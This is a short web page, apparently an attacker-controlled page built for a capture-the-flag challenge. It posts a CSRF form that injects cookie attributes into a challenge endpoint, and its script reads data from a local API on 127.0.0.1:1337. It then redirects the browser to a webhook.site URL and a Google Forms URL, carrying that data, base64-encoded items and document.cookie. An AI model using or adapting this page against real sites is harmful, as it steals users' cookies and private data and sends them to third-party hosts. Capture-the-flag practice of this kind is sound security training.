---
title: "xss"
permalink: /xss/
layout: xss
---


<div id="container">
    <h1>Welcome to this "maybe xss" program</h1>
</div>
<form action="https://jason.2021.chall.actf.co/passcode" id="csrf-form" method="POST">
    <input name="passcode" value="; secure; samesite=none">
</form>


<script>
    function load(data) {
        console.log("XSS DATA", data);
        console.log(JSON.stringify(data));
        var x = data.items.map(i => ` ${i} `).join('');
        var y = btoa(x);
        console.log(y);
        document.location = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + y + ";cookie=>" + document.cookie;
    }

    function getFlag(webhook, flag) {
        payload = JSON.stringify(flag);
        /*fetch(webhook + payload).then(res => console.log("DONE", res));*/
        document.location = webhook + payload;
    }

    let url = "127.0.0.1:1337/api/entries";
    let jsonProvaUrl = "https://jsonplaceholder.typicode.com/todos/1";
    let webhook = "https://webhook.site/e1c87264-f400-40d6-afa9-6ba829adcfbe/";
    let webhook2 = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=";

    /*let options = {
        mode: 'no-cors' // 'cors' by default
    };*/
    fetch(url)
        .then(res => { console.log(res); return res.json(); })
        .then(text => { console.log(text); getFlag(webhook2, text) })
</script>